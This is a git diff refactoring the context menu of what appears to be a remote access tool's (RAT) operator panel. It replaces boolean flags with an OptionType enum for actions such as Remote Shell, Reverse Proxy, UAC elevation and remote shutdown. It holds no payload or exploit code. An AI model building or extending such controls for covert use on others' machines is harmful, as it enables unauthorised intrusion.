@@ -1,7 +1,14 @@
 import React, { useContext, useEffect, useState, useRef } from "react";
-import { useNavigate } from "react-router-dom";
 import { RATContext } from "../rat/RATContext";
 import { ContextMenuProps, SubMenuProps } from "../../types";
+
+export enum OptionType {
+  WINDOW = "window",
+  MODAL = "modal",
+  FUNCTION = "function",
+  FUNCTION_WITH_PARAM = "function_with_param",
+}
+
 import {
   manageClientCmd,
   handleSystemCommandCmd,
@@ -36,55 +43,54 @@ const menuOptions = [
         label: "Remote Desktop",
         type: "remote-desktop",
         icon: <IconShareplay size={24} />,
-        window: true,
+        optionType: OptionType.WINDOW,
       },
       {
         label: "File Manager",
         type: "file-manager",
         icon: <IconFolder size={24} />,
-        window: true,
+        optionType: OptionType.WINDOW,
       },
       {
         label: "Remote Shell",
         type: "remote-shell",
         icon: <IconTerminal2 size={24} />,
-        window: true,
+        optionType: OptionType.WINDOW,
       },
       {
         label: "Reverse Proxy",
         type: "reverse-proxy",
         icon: <IconNetwork size={24} />,
-        window: true,
+        optionType: OptionType.WINDOW,
       },
       {
         label: "Process Viewer",
         type: "process-viewer",
         icon: <IconCpu2 size={24} />,
-        window: true,
+        optionType: OptionType.WINDOW,
       },
       {
         label: "Visit Website",
         type: "visit-website",
         icon: <IconWorld size={24} />,
-        navigate: false,
-        modal: true,
+        optionType: OptionType.MODAL,
         modalId: "visit_website_modal",
       },
       {
         label: "Elevate (UAC)",
         type: "elevate-privileges",
         icon: <IconShieldUp size={24} />,
+        optionType: OptionType.FUNCTION,
         function: handleElevateCmd,
       },
       {
         label: "MessageBox",
         type: "show-message-box",
         icon: <IconMessage2 size={24} />,
-        modal: true,
+        optionType: OptionType.MODAL,
         modalId: "message_box_modal",
       },
     ],
-    navigate: false,
   },
   {
     label: "System",
@@ -94,22 +100,24 @@ const menuOptions = [
         label: "Shutdown",
         icon: <IconPower size={24} />,
         run: "shutdown",
+        optionType: OptionType.FUNCTION_WITH_PARAM,
         function: handleSystemCommandCmd,
       },
       {
         label: "Reboot",
         icon: <IconRotate size={24} />,
         run: "reboot",
+        optionType: OptionType.FUNCTION_WITH_PARAM,
         function: handleSystemCommandCmd,
       },
       {
         label: "Log Out",
         icon: <IconLogout2 size={24} />,
         run: "logout",
+        optionType: OptionType.FUNCTION_WITH_PARAM,
         function: handleSystemCommandCmd,
       },
     ],
-    navigate: false,
   },
   {
     label: "Connection",
@@ -119,12 +127,14 @@ const menuOptions = [
         label: "Reconnect",
         icon: <IconPlug size={24} />,
         run: "reconnect",
+        optionType: OptionType.FUNCTION_WITH_PARAM,
         function: manageClientCmd,
       },
       {
         label: "Disconnect",
         icon: <IconPlugConnectedX size={24} />,
         run: "disconnect",
+        optionType: OptionType.FUNCTION_WITH_PARAM,
         function: manageClientCmd,
       },
     ],
@@ -137,10 +147,37 @@ const SubMenu: React.FC<SubMenuProps> = ({
   left,
   addr,
   clientFullName,
-  navigate,
   onClose,
 }) => {
   const { openClientWindow } = useContext(RATContext)!;
+
+  const handleOptionClick = (item: any) => {
+    switch (item.optionType) {
+      case OptionType.WINDOW:
+        if (item.type) {
+          openClientWindow(addr, item.type, clientFullName);
+        }
+        break;
+      case OptionType.MODAL:
+        if (item.modalId) {
+          (
+            document.getElementById(item.modalId) as HTMLDialogElement
+          )?.showModal();
+        }
+        break;
+      case OptionType.FUNCTION:
+        if (typeof item.function === "function") {
+          item.function(String(addr));
+        }
+        break;
+      case OptionType.FUNCTION_WITH_PARAM:
+        if (typeof item.function === "function" && item.run) {
+          item.function(String(addr), item.run);
+        }
+        break;
+    }
+    onClose();
+  };
 
   return (
     <div
@@ -153,32 +190,7 @@ const SubMenu: React.FC<SubMenuProps> = ({
         return (
           <div
             key={index}
-            onClick={() => {
-              if (item.window && typeof item.type === "string") {
-                openClientWindow(addr, item.type, clientFullName);
-              }
-              if (item.navigate && typeof item.path === "string") {
-                navigate(item.path.replace("[addr]", addr));
-              }
-              if (
-                typeof item.function === "function" &&
-                typeof item.run === "string"
-              ) {
-                item.function(String(addr), item.run);
-              }
-              if (item.modal && typeof item.modalId === "string") {
-                (
-                  document.getElementById(item.modalId) as HTMLDialogElement
-                )?.showModal();
-              }
-              if (
-                typeof item.function === "function" &&
-                typeof item.run === "undefined"
-              ) {
-                item.function(String(addr));
-              }
-              onClose();
-            }}
+            onClick={() => handleOptionClick(item)}
             className={`context-menu flex-row gap-3 cursor-pointer flex w-full p-2 hover:bg-accentx transition-all ${
               isLast ? "" : "border-b border-accentx "
             }`}
@@ -200,7 +212,6 @@ export const ContextMenu: React.FC<ContextMenuProps> = ({
   clientFullName,
 }) => {
   const { setSelectedClient } = useContext(RATContext)!;
-  const navigate = useNavigate();
   const [activeIndex, setActiveIndex] = useState<number | null>(null);
   const [submenuPosition, setSubmenuPosition] = useState({ top: 0, left: 0 });
   const menuRef = useRef<HTMLDivElement>(null);
@@ -278,7 +289,7 @@ export const ContextMenu: React.FC<ContextMenuProps> = ({
             >
               {option.icon}
               {option.label}
-              {!option.navigate && option.options && (
+              {option.options && (
                 <i className="ri-arrow-right-line ml-auto"></i>
               )}
             </div>
@@ -293,7 +304,6 @@ export const ContextMenu: React.FC<ContextMenuProps> = ({
             left={submenuPosition.left}
             addr={addr}
             clientFullName={clientFullName}
-            navigate={navigate}
             onClose={onClose}
           />
         </div>
